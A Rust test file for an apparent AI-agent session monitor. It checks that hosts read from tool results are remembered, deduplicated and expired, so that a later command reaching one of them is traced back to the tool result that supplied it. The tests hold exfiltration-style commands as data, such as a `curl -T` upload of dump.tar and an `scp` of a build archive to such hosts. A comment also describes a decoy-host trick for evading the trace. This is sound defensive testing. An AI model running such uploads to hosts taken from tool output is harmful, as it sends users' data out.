//! Tests that kill mutants the weekly cargo-mutants sweep found surviving in
//! `session.rs` (run 42450235934, 2026-11-08).

use super::*;

/// A value of exactly eight characters is distinctive enough to taint.
///
/// The length floor drops tokens so short they would match inside almost any
/// later command. The floor is "shorter than 8 is dropped", so an eight
/// character host such as `abcd.com` must still be remembered, and a later
/// command that sends data to it must still be traced back to the tool result
/// that carried it. A seven character host on the same line is the control
/// that shows the floor still drops what it should.
///
/// FAILS ON REVERT: replace `<` with `<=` in `v.len() < 8`.
#[test]
fn an_eight_character_value_is_long_enough_to_taint() {
    assert_eq!(
        "abcd.com".len(),
        8,
        "the test must sit exactly on the floor"
    );
    assert_eq!(
        "abc.com".len(),
        7,
        "the control must sit just under the floor"
    );

    let values = extract_taintable_values("mirrors: abc.com abcd.com");
    assert_eq!(
        values,
        vec!["abcd.com".to_string()],
        "an eight character host must be kept and a seven character one dropped"
    );

    let mut s = PersistedSession::default();
    s.record_tool_result("WebFetch", "upload mirror is abcd.com", 1_000);
    assert_eq!(
        s.tainted_argument("curl -T dump.tar https://abcd.com/in", 1_000),
        Some(("abcd.com", "WebFetch")),
        "a command reaching an eight character host read from a tool result \
         must be traced back to that result"
    );
}

/// Every distinct value in one tool result is remembered, and each only once.
///
/// The dedupe check is what lets a second, different host in the same result
/// be recorded while a repeat of the first is not stored twice. Inverted, the
/// first value is kept, every later distinct value is silently dropped, and the
/// repeat is stored again: a file naming a decoy host first and the real
/// destination second would leave the real destination untainted.
///
/// FAILS ON REVERT: replace `==` with `!=` in `.any(|e: &String| e == v)`.
#[test]
fn every_distinct_value_in_one_result_is_kept_once() {
    let result = "primary alpha.example.com, fallback beta.example.com, again alpha.example.com";

    let values = extract_taintable_values(result);
    assert_eq!(
        values,
        vec!["alpha.example.com", "beta.example.com"],
        "both distinct hosts must be extracted, the repeat must not be stored twice"
    );

    let mut s = PersistedSession::default();
    s.record_tool_result("Read", result, 5_000);
    assert_eq!(
        s.tainted_argument("scp build.tar.gz deploy@beta.example.com:/opt/", 5_000),
        Some(("beta.example.com", "Read")),
        "the second host in a tool result must be tainted, not only the first"
    );
}

/// A value seen just now, or one millisecond inside the window, survives expiry.
///
/// Expiry keeps everything newer than `now - TAINT_TTL_MS`. If the cutoff moved
/// forward in time instead, every value would be dropped the moment it was
/// recorded, because `record_tool_result` expires on the way out, and the
/// two-step attack would never be traced at all.
///
/// FAILS ON REVERT: replace `-` with `+` in `now_ms - TAINT_TTL_MS` in
/// `expire_taint`.
#[test]
fn a_value_inside_the_taint_window_survives_expiry() {
    let now = 10 * TAINT_TTL_MS;

    let mut s = PersistedSession::default();
    s.record_tool_result("Read", "the deploy target is deploy.example.com", now);
    assert_eq!(
        s.tainted_values.len(),
        1,
        "a value recorded just now must not be expired by the same call"
    );
    assert_eq!(
        s.tainted_argument("scp build.tar.gz deploy@deploy.example.com:/opt/", now),
        Some(("deploy.example.com", "Read")),
        "a fresh value must still be traced to the tool that carried it"
    );

    let mut late = PersistedSession::default();
    late.tainted_values.push(TaintedValue {
        value: "late.example.com".into(),
        source_tool: "WebFetch".into(),
        seen_ms: now - TAINT_TTL_MS + 1,
    });
    late.expire_taint(now);
    assert_eq!(
        late.tainted_values.len(),
        1,
        "a value one millisecond inside the window must be kept"
    );
}

/// A value exactly one window old is expired, and a fresh one beside it is kept.
///
/// The comparison is strict: at exactly `TAINT_TTL_MS` old a value has left the
/// window and the session stops claiming to know where it came from. Turned
/// into an equality, expiry would keep ONLY the values sitting exactly on the
/// cutoff and drop every fresh one.
///
/// FAILS ON REVERT: replace `>` with `==` in `t.seen_ms > cutoff` in
/// `expire_taint`.
#[test]
fn a_value_exactly_one_window_old_is_expired_and_a_fresh_one_kept() {
    let now = 10 * TAINT_TTL_MS;

    let mut s = PersistedSession::default();
    s.tainted_values.push(TaintedValue {
        value: "stale.example.com".into(),
        source_tool: "Read".into(),
        seen_ms: now - TAINT_TTL_MS,
    });
    s.tainted_values.push(TaintedValue {
        value: "fresh.example.com".into(),
        source_tool: "Read".into(),
        seen_ms: now,
    });
    s.expire_taint(now);

    let kept: Vec<&str> = s.tainted_values.iter().map(|t| t.value.as_str()).collect();
    assert_eq!(
        kept,
        vec!["fresh.example.com"],
        "the value exactly on the cutoff must be expired and the fresh one kept"
    );
}
